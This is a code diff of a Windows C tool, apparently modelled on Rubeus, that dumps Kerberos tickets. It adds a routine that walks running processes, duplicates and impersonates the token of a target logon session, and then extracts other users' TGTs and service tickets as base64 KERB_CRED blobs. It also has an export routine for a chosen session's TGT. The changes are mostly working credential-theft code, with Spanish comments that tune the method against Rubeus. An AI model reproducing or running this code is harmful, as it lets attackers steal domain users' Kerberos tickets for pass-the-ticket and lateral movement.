@@ -1,4 +1,4 @@
-#define _CRT_SECURE_NO_WARNINGS
+﻿#define _CRT_SECURE_NO_WARNINGS
 #include <windows.h>
 #include <ntsecapi.h>
 #include <sddl.h>
@@ -9,6 +9,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <stdint.h>
+#include <tlhelp32.h>
 
 #pragma comment(lib, "secur32.lib")
 #pragma comment(lib, "advapi32.lib")
@@ -19,9 +20,7 @@ typedef NTSTATUS(NTAPI* PLSA_FREE_RETURN_BUFFER)(PVOID);
 typedef NTSTATUS(NTAPI* PLSA_CONNECT_UNTRUSTED)(PHANDLE);
 typedef NTSTATUS(NTAPI* PLSA_LOOKUP_AUTHENTICATION_PACKAGE)(HANDLE, PLSA_STRING, PULONG);
 typedef NTSTATUS(NTAPI* PLSA_CALL_AUTHENTICATION_PACKAGE)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
-typedef NTSTATUS(NTAPI* PLSA_REGISTER_LOGON_PROCESS)(PLSA_STRING, PHANDLE, PLSA_OPERATIONAL_MODE);
 
-// Structure to store TGT information for summary
 typedef struct {
     ULONG logonId;
     wchar_t userName[256];
@@ -63,7 +62,6 @@ const char* GetEncryptionTypeName(LONG e) {
     }
 }
 
-// Base64 encoding table
 static const char base64_chars[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
 char* Base64Encode(const unsigned char* data, size_t input_length) {
@@ -84,7 +82,6 @@ char* Base64Encode(const unsigned char* data, size_t input_length) {
         encoded_data[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
     }
 
-    // Add padding
     for (i = 0; i < (3 - input_length % 3) % 3; i++)
         encoded_data[output_length - 1 - i] = '=';
 
@@ -97,13 +94,19 @@ void PrintBase64(const char* base64_string) {
         printf("      (empty)\n");
         return;
     }
-
-    // Print in a single line
     printf("      %s\n", base64_string);
 }
 
 void AddTGTToList(ULONG logonId, const wchar_t* userName, const wchar_t* domain, const wchar_t* serviceName) {
     if (g_tgtCount >= MAX_TGTS) return;
+
+    // Verificar si ya existe un TGT para este LogonId
+    for (ULONG i = 0; i < g_tgtCount; i++) {
+        if (g_tgtList[i].logonId == logonId &&
+            wcscmp(g_tgtList[i].serviceName, serviceName) == 0) {
+            return;
+        }
+    }
 
     g_tgtList[g_tgtCount].logonId = logonId;
 
@@ -279,20 +282,56 @@ void EnumerateMyTickets() {
     FreeLibrary(h);
 }
 
+BOOL ImpersonateSession(ULONG targetLogonId, HANDLE* hImpToken) {
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;
+
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (!Process32First(hSnapshot, &pe32)) {
+        CloseHandle(hSnapshot);
+        return FALSE;
+    }
+
+    do {
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
+        if (!hProcess) continue;
+
+        HANDLE hToken;
+        if (OpenProcessToken(hProcess, TOKEN_QUERY | TOKEN_DUPLICATE, &hToken)) {
+            TOKEN_STATISTICS stats;
+            DWORD len;
+            if (GetTokenInformation(hToken, TokenStatistics, &stats, sizeof(stats), &len)) {
+                if (stats.AuthenticationId.LowPart == targetLogonId) {
+                    if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL,
+                        SecurityImpersonation, TokenImpersonation, hImpToken)) {
+                        CloseHandle(hToken);
+                        CloseHandle(hProcess);
+                        CloseHandle(hSnapshot);
+                        return TRUE;
+                    }
+                }
+            }
+            CloseHandle(hToken);
+        }
+        CloseHandle(hProcess);
+    } while (Process32Next(hSnapshot, &pe32));
+
+    CloseHandle(hSnapshot);
+    return FALSE;
+}
+
 void EnumerateAllTickets() {
     PrintDebug("Enumerating tickets from ALL sessions on the machine...");
 
-    // Reset TGT list
     g_tgtCount = 0;
 
-    // Enable SeDebugPrivilege and SeTcbPrivilege
     HANDLE hToken;
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
-    BOOL privEnabled = FALSE;
     if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
-        // Try SeDebugPrivilege
         if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
             tp.PrivilegeCount = 1;
             tp.Privileges[0].Luid = luid;
@@ -301,51 +340,19 @@ void EnumerateAllTickets() {
                 DWORD err = GetLastError();
                 if (err == ERROR_SUCCESS) {
                     PrintSuccess("SeDebugPrivilege enabled successfully");
-                    privEnabled = TRUE;
                 }
                 else if (err == ERROR_NOT_ALL_ASSIGNED) {
                     PrintError("SeDebugPrivilege not available (need Administrator rights)");
                 }
-                else {
-                    printf("[!] AdjustTokenPrivileges returned error: %lu\n", err);
-                }
             }
         }
-        else {
-            printf("[!] LookupPrivilegeValue failed: %lu\n", GetLastError());
-        }
-
-        // Try SeTcbPrivilege (required for LsaRegisterLogonProcess)
-        if (LookupPrivilegeValue(NULL, SE_TCB_NAME, &luid)) {
-            tp.PrivilegeCount = 1;
-            tp.Privileges[0].Luid = luid;
-            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
-                DWORD err = GetLastError();
-                if (err == ERROR_SUCCESS) {
-                    PrintSuccess("SeTcbPrivilege enabled successfully");
-                }
-                else if (err == ERROR_NOT_ALL_ASSIGNED) {
-                    PrintError("SeTcbPrivilege not available (only SYSTEM has this privilege)");
-                    printf("[!] LsaRegisterLogonProcess will likely fail\n");
-                    printf("[!] This is normal - most tools cannot enumerate other users' tickets\n");
-                }
-                else {
-                    printf("[!] AdjustTokenPrivileges for SeTcb returned error: %lu\n", err);
-                }
-            }
-        }
-
         CloseHandle(hToken);
-    }
-    else {
-        printf("[!] OpenProcessToken failed: %lu\n", GetLastError());
     }
 
     HMODULE h = LoadLibraryA("secur32.dll");
     PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
     PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
-    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
+    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
     PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
     PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
     PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");
@@ -362,40 +369,11 @@ void EnumerateAllTickets() {
     printf("Found %lu logon sessions\n\n", (unsigned long)session_cnt);
 
     HANDLE lsa = NULL;
-    LSA_STRING lsaName;
-    char lsaNameStr[] = "KlistClone";
-    lsaName.Buffer = lsaNameStr;
-    lsaName.Length = (USHORT)strlen(lsaNameStr);
-    lsaName.MaximumLength = lsaName.Length + 1;
-    LSA_OPERATIONAL_MODE mode = 0;
-
-    // Try to use LsaRegisterLogonProcess for full access
-    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
-    if (regStatus != 0) {
-        printf("[!] LsaRegisterLogonProcess failed with status 0x%08lX\n", (unsigned long)regStatus);
-
-        // Common error codes
-        if (regStatus == 0xC0000022) {
-            printf("[!] STATUS_ACCESS_DENIED - Access Denied\n");
-            printf("[!] You need to run this program as Administrator\n");
-        }
-        else if (regStatus == 0xC000000D) {
-            printf("[!] STATUS_INVALID_PARAMETER - Invalid Parameter\n");
-        }
-        else if (regStatus == 0xC0000041) {
-            printf("[!] STATUS_PORT_DISCONNECTED - LSA port disconnected\n");
-            printf("[!] This can happen if the LSA is not properly initialized\n");
-        }
-
-        PrintError("Cannot enumerate tickets from other sessions without LsaRegisterLogonProcess");
-        PrintError("Will only be able to query current user's session");
-
-        FreeLibrary(h);
+    if (con_fn(&lsa) != 0) {
+        PrintError("LsaConnectUntrusted failed");
         fre_fn(session_list);
+        FreeLibrary(h);
         return;
-    }
-    else {
-        PrintSuccess("LsaRegisterLogonProcess succeeded - full access granted");
     }
 
     char krb[] = "Kerberos";
@@ -445,7 +423,6 @@ void EnumerateAllTickets() {
             auth_pkg[len] = L'\0';
         }
 
-        // Convert SID to string
         if (session_data->Sid) {
             LPWSTR sidString = NULL;
             if (ConvertSidToStringSidW(session_data->Sid, &sidString)) {
@@ -454,17 +431,97 @@ void EnumerateAllTickets() {
             }
         }
 
-        KERB_QUERY_TKT_CACHE_REQUEST req;
-        req.MessageType = KerbQueryTicketCacheMessage;
-        req.LogonId = session_list[i];
+        // ============================================================================
+        // CORRECCIÓN #1: NO FILTRAR POR PAQUETE DE AUTENTICACIÓN
+        // Rubeus consulta TODAS las sesiones, no solo las que son "Kerberos"
+        // ============================================================================
+
+        printf("[DEBUG] Processing session 0x%lx [%ls\\%ls] (Package: %ls)\n",
+            (unsigned long)session_list[i].LowPart,
+            wcslen(dom) ? dom : L"?",
+            wcslen(usr) ? usr : L"?",
+            wcslen(auth_pkg) ? auth_pkg : L"?");
+
+        // ============================================================================
+        // CORRECCIÓN #2: INTENTAR DOS MÉTODOS (como Rubeus)
+        // Método 1: Impersonar y usar LogonId = 0
+        // Método 2: No impersonar y usar LogonId específico
+        // ============================================================================
 
         PKERB_QUERY_TKT_CACHE_RESPONSE rsp = NULL;
         ULONG sz = 0;
         NTSTATUS sub = 0;
+        NTSTATUS status = -1;
+        BOOL used_impersonation = FALSE;
 
-        NTSTATUS status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+        // ========== MÉTODO 1: CON IMPERSONACIÓN ==========
+        HANDLE hImpToken = NULL;
+        BOOL needRevert = FALSE;
 
-        // Print session info even if no tickets
+        if (ImpersonateSession(session_list[i].LowPart, &hImpToken)) {
+            if (ImpersonateLoggedOnUser(hImpToken)) {
+                needRevert = TRUE;
+                used_impersonation = TRUE;
+
+                KERB_QUERY_TKT_CACHE_REQUEST req;
+                req.MessageType = KerbQueryTicketCacheMessage;
+                req.LogonId.LowPart = 0;  // Usar 0 cuando estás impersonado
+                req.LogonId.HighPart = 0;
+
+                status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+
+                RevertToSelf();
+                CloseHandle(hImpToken);
+
+                if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
+                    printf("[DEBUG] ✓ Method 1 (impersonation) successful - Found %lu tickets\n",
+                        (unsigned long)rsp->CountOfTickets);
+                }
+                else {
+                    printf("[DEBUG] → Method 1 (impersonation) failed or no tickets (Status: 0x%08lX, Sub: 0x%08lX)\n",
+                        (unsigned long)status, (unsigned long)sub);
+                    if (rsp) {
+                        fre_fn(rsp);
+                        rsp = NULL;
+                    }
+                    used_impersonation = FALSE;
+                }
+            }
+            else {
+                CloseHandle(hImpToken);
+            }
+        }
+
+        // ========== MÉTODO 2: SIN IMPERSONACIÓN (si método 1 falló) ==========
+        if (!used_impersonation || !rsp) {
+            KERB_QUERY_TKT_CACHE_REQUEST req;
+            req.MessageType = KerbQueryTicketCacheMessage;
+            req.LogonId.LowPart = session_list[i].LowPart;  // Usar LogonId real
+            req.LogonId.HighPart = session_list[i].HighPart;
+
+            status = cal_fn(lsa, auth, &req, sizeof(req), (PVOID*)&rsp, &sz, &sub);
+
+            if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
+                printf("[DEBUG] ✓ Method 2 (direct query) successful - Found %lu tickets\n",
+                    (unsigned long)rsp->CountOfTickets);
+            }
+            else {
+                printf("[DEBUG] → Method 2 (direct query) failed or no tickets (Status: 0x%08lX, Sub: 0x%08lX)\n",
+                    (unsigned long)status, (unsigned long)sub);
+            }
+        }
+
+        // Si no obtuvimos tickets, continuar con la siguiente sesión
+        if (status != 0 || sub != 0 || !rsp || rsp->CountOfTickets == 0) {
+            if (rsp) fre_fn(rsp);
+            fre_fn(session_data);
+            continue;
+        }
+
+        // ============================================================================
+        // IMPRIMIR INFORMACIÓN DE LA SESIÓN
+        // ============================================================================
+
         printf("  UserName                 : %ls\n", wcslen(usr) ? usr : L"(null)");
         printf("  Domain                   : %ls\n", wcslen(dom) ? dom : L"(null)");
         printf("  LogonId                  : 0x%lx\n", (unsigned long)session_list[i].LowPart);
@@ -504,164 +561,156 @@ void EnumerateAllTickets() {
             printf("\n");
         }
 
-        // Debug ticket query status
-        if (status != 0) {
-            printf("  [DEBUG] LsaCallAuthenticationPackage failed with status 0x%08lX\n", (unsigned long)status);
-        }
-        if (sub != 0) {
-            printf("  [DEBUG] SubStatus: 0x%08lX", (unsigned long)sub);
-            // Common error codes
-            if (sub == 0xC000005E) {
-                printf(" (STATUS_NO_LOGON_SERVERS - No logon session)");
+        total_sessions_with_tickets++;
+        printf("\n");
+
+        // ============================================================================
+        // ENUMERAR TODOS LOS TICKETS (TGTs Y SERVICE TICKETS)
+        // ============================================================================
+
+        for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
+            KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
+            wchar_t srv[512] = { 0 }, rlm[256] = { 0 };
+
+            if (t->ServerName.Buffer && t->ServerName.Length > 0) {
+                size_t len = t->ServerName.Length / sizeof(WCHAR);
+                if (len > 511) len = 511;
+                wcsncpy(srv, t->ServerName.Buffer, len);
+                srv[len] = L'\0';
             }
-            else if (sub == 0xC0000520) {
-                printf(" (STATUS_LOGON_SESSION_COLLISION)");
+
+            if (t->RealmName.Buffer && t->RealmName.Length > 0) {
+                size_t len = t->RealmName.Length / sizeof(WCHAR);
+                if (len > 255) len = 255;
+                wcsncpy(rlm, t->RealmName.Buffer, len);
+                rlm[len] = L'\0';
             }
-            else if (sub == 0xC0000064) {
-                printf(" (STATUS_NO_SUCH_LOGON_SESSION)");
+
+            BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
+            if (is_tgt) {
+                total_tgts++;
+                AddTGTToList(session_list[i].LowPart, usr, dom, srv);
             }
-            else if (sub == 0xC0000061) {
-                printf(" (STATUS_PRIVILEGE_NOT_HELD - Need LsaRegisterLogonProcess, not LsaConnectUntrusted)");
+
+            const wchar_t* ticket_type = L"Service Ticket";
+            if (is_tgt) {
+                ticket_type = L"Ticket Granting Ticket (TGT)";
             }
-            else if (sub == 0xC000005F) {
-                printf(" (STATUS_NO_SUCH_PACKAGE - Kerberos not available for this session)");
-            }
+
             printf("\n");
-        }
+            printf("    TicketType               :  %ls\n", ticket_type);
+            printf("    ServiceName              :  %ls\n", srv);
+            printf("    ServiceRealm             :  %ls\n", rlm);
+            printf("    UserName                 :  %ls\n", wcslen(usr) ? usr : L"(unknown)");
+            printf("    UserRealm                :  %ls\n", rlm);
 
-        if (status == 0 && sub == 0 && rsp && rsp->CountOfTickets > 0) {
-            total_sessions_with_tickets++;
+            FILETIME ft_start, ft_end, ft_renew;
+            ft_start.dwLowDateTime = t->StartTime.LowPart;
+            ft_start.dwHighDateTime = t->StartTime.HighPart;
+            ft_end.dwLowDateTime = t->EndTime.LowPart;
+            ft_end.dwHighDateTime = t->EndTime.HighPart;
+            ft_renew.dwLowDateTime = t->RenewTime.LowPart;
+            ft_renew.dwHighDateTime = t->RenewTime.HighPart;
+
+            FileTimeToSystemTime(&ft_start, &stm);
+            printf("    StartTime                :  %02d/%02d/%04d %02d:%02d:%02d\n",
+                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+            FileTimeToSystemTime(&ft_end, &stm);
+            printf("    EndTime                  :  %02d/%02d/%04d %02d:%02d:%02d\n",
+                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+            FileTimeToSystemTime(&ft_renew, &stm);
+            printf("    RenewTill                :  %02d/%02d/%04d %02d:%02d:%02d\n",
+                stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
+
+            printf("    Flags                    :  ");
+            BOOL first = TRUE;
+            if (t->TicketFlags & 0x40000000) { printf("forwardable"); first = FALSE; }
+            if (t->TicketFlags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
+            if (t->TicketFlags & 0x00400000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
+            if (t->TicketFlags & 0x00200000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
+            if (t->TicketFlags & 0x20000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
+            if (t->TicketFlags & 0x00000001) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
+            if (t->TicketFlags & 0x00010000) { if (!first) printf(", "); printf("name_canonicalize"); }
             printf("\n");
 
-            for (ULONG j = 0; j < rsp->CountOfTickets; j++) {
-                KERB_TICKET_CACHE_INFO* t = &rsp->Tickets[j];
-                wchar_t srv[512] = { 0 }, rlm[256] = { 0 };
+            printf("    KeyType                  :  %s\n", GetEncryptionTypeName(t->EncryptionType));
+            printf("    Base64(key)              :  (not available)\n");
 
-                if (t->ServerName.Buffer && t->ServerName.Length > 0) {
-                    size_t len = t->ServerName.Length / sizeof(WCHAR);
-                    if (len > 511) len = 511;
-                    wcsncpy(srv, t->ServerName.Buffer, len);
-                    srv[len] = L'\0';
+            // ============================================================================
+            // RETRIEVE: Impersonar de nuevo para obtener el ticket completo
+            // ============================================================================
+            HANDLE hImpToken2 = NULL;
+            BOOL needRevert2 = FALSE;
+
+            if (ImpersonateSession(session_list[i].LowPart, &hImpToken2)) {
+                if (ImpersonateLoggedOnUser(hImpToken2)) {
+                    needRevert2 = TRUE;
                 }
+            }
 
-                if (t->RealmName.Buffer && t->RealmName.Length > 0) {
-                    size_t len = t->RealmName.Length / sizeof(WCHAR);
-                    if (len > 255) len = 255;
-                    wcsncpy(rlm, t->RealmName.Buffer, len);
-                    rlm[len] = L'\0';
-                }
+            ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(srv) * sizeof(WCHAR)));
+            PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
 
-                BOOL is_tgt = (wcsstr(srv, L"krbtgt") != NULL);
-                if (is_tgt) {
-                    total_tgts++;
-                    // Add to TGT list
-                    AddTGTToList(session_list[i].LowPart, usr, dom, srv);
-                }
+            if (retReq) {
+                ZeroMemory(retReq, reqSize);
+                retReq->MessageType = KerbRetrieveEncodedTicketMessage;
+                retReq->LogonId.LowPart = 0;
+                retReq->LogonId.HighPart = 0;
+                retReq->TicketFlags = 0;
+                retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
+                retReq->EncryptionType = 0;
+                retReq->TargetName.Length = (USHORT)(wcslen(srv) * sizeof(WCHAR));
+                retReq->TargetName.MaximumLength = retReq->TargetName.Length;
+                retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
+                memcpy(retReq->TargetName.Buffer, srv, retReq->TargetName.Length);
 
-                // Determine ticket type
-                const wchar_t* ticket_type = L"Service Ticket";
-                if (is_tgt) {
-                    ticket_type = L"Ticket Granting Ticket (TGT)";
-                }
+                PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
+                ULONG retSz = 0;
+                NTSTATUS retSub = 0;
 
-                printf("\n");
-                printf("    TicketType               :  %ls\n", ticket_type);
-                printf("    ServiceName              :  %ls\n", srv);
-                printf("    ServiceRealm             :  %ls\n", rlm);
-                printf("    UserName                 :  %ls\n", wcslen(usr) ? usr : L"(unknown)");
-                printf("    UserRealm                :  %ls\n", rlm);
+                NTSTATUS retStatus = cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &retSub);
 
-                FILETIME ft_start, ft_end, ft_renew;
-                ft_start.dwLowDateTime = t->StartTime.LowPart;
-                ft_start.dwHighDateTime = t->StartTime.HighPart;
-                ft_end.dwLowDateTime = t->EndTime.LowPart;
-                ft_end.dwHighDateTime = t->EndTime.HighPart;
-                ft_renew.dwLowDateTime = t->RenewTime.LowPart;
-                ft_renew.dwHighDateTime = t->RenewTime.HighPart;
+                if (retStatus == 0 && retSub == 0 && retRsp) {
+                    char* base64_ticket = Base64Encode(
+                        retRsp->Ticket.EncodedTicket,
+                        retRsp->Ticket.EncodedTicketSize
+                    );
 
-                FileTimeToSystemTime(&ft_start, &stm);
-                printf("    StartTime                :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-                FileTimeToSystemTime(&ft_end, &stm);
-                printf("    EndTime                  :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-                FileTimeToSystemTime(&ft_renew, &stm);
-                printf("    RenewTill                :  %02d/%02d/%04d %02d:%02d:%02d\n",
-                    stm.wDay, stm.wMonth, stm.wYear, stm.wHour, stm.wMinute, stm.wSecond);
-
-                printf("    Flags                    :  ");
-                BOOL first = TRUE;
-                if (t->TicketFlags & 0x40000000) { printf("forwardable"); first = FALSE; }
-                if (t->TicketFlags & 0x00800000) { if (!first) printf(", "); printf("renewable"); first = FALSE; }
-                if (t->TicketFlags & 0x00400000) { if (!first) printf(", "); printf("initial"); first = FALSE; }
-                if (t->TicketFlags & 0x00200000) { if (!first) printf(", "); printf("pre_authent"); first = FALSE; }
-                if (t->TicketFlags & 0x20000000) { if (!first) printf(", "); printf("forwarded"); first = FALSE; }
-                if (t->TicketFlags & 0x00000001) { if (!first) printf(", "); printf("ok_as_delegate"); first = FALSE; }
-                if (t->TicketFlags & 0x00010000) { if (!first) printf(", "); printf("name_canonicalize"); }
-                printf("\n");
-
-                printf("    KeyType                  :  %s\n", GetEncryptionTypeName(t->EncryptionType));
-                printf("    Base64(key)              :  (not available)\n");
-
-                // NEW: Retrieve the actual ticket data
-                ULONG reqSize = (ULONG)(sizeof(KERB_RETRIEVE_TKT_REQUEST) + (wcslen(srv) * sizeof(WCHAR)));
-                PKERB_RETRIEVE_TKT_REQUEST retReq = (PKERB_RETRIEVE_TKT_REQUEST)malloc(reqSize);
-
-                if (retReq) {
-                    ZeroMemory(retReq, reqSize);
-                    retReq->MessageType = KerbRetrieveEncodedTicketMessage;
-                    retReq->LogonId = session_list[i];
-                    retReq->TicketFlags = 0;
-                    retReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED;
-                    retReq->EncryptionType = 0;
-                    retReq->TargetName.Length = (USHORT)(wcslen(srv) * sizeof(WCHAR));
-                    retReq->TargetName.MaximumLength = retReq->TargetName.Length;
-                    retReq->TargetName.Buffer = (PWSTR)((PBYTE)retReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
-                    memcpy(retReq->TargetName.Buffer, srv, retReq->TargetName.Length);
-
-                    PKERB_RETRIEVE_TKT_RESPONSE retRsp = NULL;
-                    ULONG retSz = 0;
-                    NTSTATUS retSub = 0;
-
-                    if (cal_fn(lsa, auth, retReq, reqSize, (PVOID*)&retRsp, &retSz, &retSub) == 0 && retSub == 0 && retRsp) {
-                        // Encode ticket to Base64
-                        char* base64_ticket = Base64Encode(
-                            retRsp->Ticket.EncodedTicket,
-                            retRsp->Ticket.EncodedTicketSize
-                        );
-
-                        printf("    Base64EncodedTicket   :\n");
-                        if (base64_ticket) {
-                            PrintBase64(base64_ticket);
-                            free(base64_ticket);
-                        }
-                        else {
-                            printf("      (failed to encode)\n");
-                        }
-
-                        fre_fn(retRsp);
+                    printf("    Base64EncodedTicket   :\n");
+                    if (base64_ticket) {
+                        PrintBase64(base64_ticket);
+                        free(base64_ticket);
                     }
                     else {
-                        printf("    Base64EncodedTicket   :\n");
-                        printf("      (failed to retrieve - Status=0x%08lX, SubStatus=0x%08lX)\n",
-                            (unsigned long)0, (unsigned long)retSub);
+                        printf("      (failed to encode)\n");
                     }
 
-                    free(retReq);
+                    fre_fn(retRsp);
                 }
                 else {
                     printf("    Base64EncodedTicket   :\n");
-                    printf("      (memory allocation failed)\n");
+                    printf("      (failed to retrieve - Status=0x%08lX, SubStatus=0x%08lX)\n",
+                        (unsigned long)retStatus, (unsigned long)retSub);
                 }
 
-                total_tickets++;
+                free(retReq);
+            }
+            else {
+                printf("    Base64EncodedTicket   :\n");
+                printf("      (memory allocation failed)\n");
             }
 
-            fre_fn(rsp);
+            if (needRevert2) {
+                RevertToSelf();
+                CloseHandle(hImpToken2);
+            }
+
+            total_tickets++;
         }
 
+        fre_fn(rsp);
         printf("\n");
         fre_fn(session_data);
     }
@@ -696,7 +745,6 @@ void EnumerateAllTickets() {
 }
 
 void ExportTicket(const char* logonIdStr) {
-    // Parse LogonId from hex string (e.g., "0x79fb3")
     ULONG logonId = 0;
     if (sscanf(logonIdStr, "0x%lx", &logonId) != 1 && sscanf(logonIdStr, "%lx", &logonId) != 1) {
         printf("Error: Invalid LogonId format. Use hex format like 0x79fb3 or 79fb3\n");
@@ -706,18 +754,17 @@ void ExportTicket(const char* logonIdStr) {
     HMODULE h = LoadLibraryA("secur32.dll");
     PLSA_ENUMERATE_LOGON_SESSIONS enum_fn = (PLSA_ENUMERATE_LOGON_SESSIONS)GetProcAddress(h, "LsaEnumerateLogonSessions");
     PLSA_GET_LOGON_SESSION_DATA get_fn = (PLSA_GET_LOGON_SESSION_DATA)GetProcAddress(h, "LsaGetLogonSessionData");
-    PLSA_REGISTER_LOGON_PROCESS reg_fn = (PLSA_REGISTER_LOGON_PROCESS)GetProcAddress(h, "LsaRegisterLogonProcess");
+    PLSA_CONNECT_UNTRUSTED con_fn = (PLSA_CONNECT_UNTRUSTED)GetProcAddress(h, "LsaConnectUntrusted");
     PLSA_LOOKUP_AUTHENTICATION_PACKAGE lkp_fn = (PLSA_LOOKUP_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaLookupAuthenticationPackage");
     PLSA_CALL_AUTHENTICATION_PACKAGE cal_fn = (PLSA_CALL_AUTHENTICATION_PACKAGE)GetProcAddress(h, "LsaCallAuthenticationPackage");
     PLSA_FREE_RETURN_BUFFER fre_fn = (PLSA_FREE_RETURN_BUFFER)GetProcAddress(h, "LsaFreeReturnBuffer");
 
-    if (!enum_fn || !get_fn || !reg_fn || !lkp_fn || !cal_fn || !fre_fn) {
+    if (!enum_fn || !get_fn || !con_fn || !lkp_fn || !cal_fn || !fre_fn) {
         PrintError("Failed to get LSA functions");
         FreeLibrary(h);
         return;
     }
 
-    // Find the session with matching LogonId
     ULONG session_cnt = 0;
     PLUID session_list = NULL;
 
@@ -767,19 +814,9 @@ void ExportTicket(const char* logonIdStr) {
         return;
     }
 
-    // Register with LSA
     HANDLE lsa = NULL;
-    LSA_STRING lsaName;
-    char lsaNameStr[] = "KlistClone";
-    lsaName.Buffer = lsaNameStr;
-    lsaName.Length = (USHORT)strlen(lsaNameStr);
-    lsaName.MaximumLength = lsaName.Length + 1;
-    LSA_OPERATIONAL_MODE mode = 0;
-
-    NTSTATUS regStatus = reg_fn(&lsaName, &lsa, &mode);
-    if (regStatus != 0) {
-        printf("Error: LsaRegisterLogonProcess failed with status 0x%08lX\n", (unsigned long)regStatus);
-        printf("You need Administrator privileges to export tickets from other sessions\n");
+    if (con_fn(&lsa) != 0) {
+        PrintError("LsaConnectUntrusted failed");
         fre_fn(session_list);
         FreeLibrary(h);
         return;
@@ -800,10 +837,19 @@ void ExportTicket(const char* logonIdStr) {
         return;
     }
 
-    // Query tickets for this LogonId
+    HANDLE hImpToken = NULL;
+    BOOL needRevert = FALSE;
+
+    if (ImpersonateSession(logonId, &hImpToken)) {
+        if (ImpersonateLoggedOnUser(hImpToken)) {
+            needRevert = TRUE;
+        }
+    }
+
     KERB_QUERY_TKT_CACHE_REQUEST cacheReq;
     cacheReq.MessageType = KerbQueryTicketCacheMessage;
-    cacheReq.LogonId = targetLuid;
+    cacheReq.LogonId.LowPart = 0;
+    cacheReq.LogonId.HighPart = 0;
 
     PKERB_QUERY_TKT_CACHE_RESPONSE cacheRsp = NULL;
     ULONG sz = 0;
@@ -811,13 +857,16 @@ void ExportTicket(const char* logonIdStr) {
 
     if (cal_fn(lsa, auth, &cacheReq, sizeof(cacheReq), (PVOID*)&cacheRsp, &sz, &sub) != 0 || sub != 0) {
         printf("Error: Failed to get ticket cache for LogonId 0x%lx\n", logonId);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    // Find the first TGT
     BOOL found = FALSE;
     wchar_t targetSrv[512] = { 0 };
 
@@ -843,19 +892,26 @@ void ExportTicket(const char* logonIdStr) {
     if (!found) {
         printf("Error: No TGT found for LogonId 0x%lx\n", logonId);
         fre_fn(cacheRsp);
+        if (needRevert) {
+            RevertToSelf();
+            CloseHandle(hImpToken);
+        }
         LsaDeregisterLogonProcess(lsa);
         fre_fn(session_list);
         FreeLibrary(h);
         return;
     }
 
-    // Retrieve the ticket
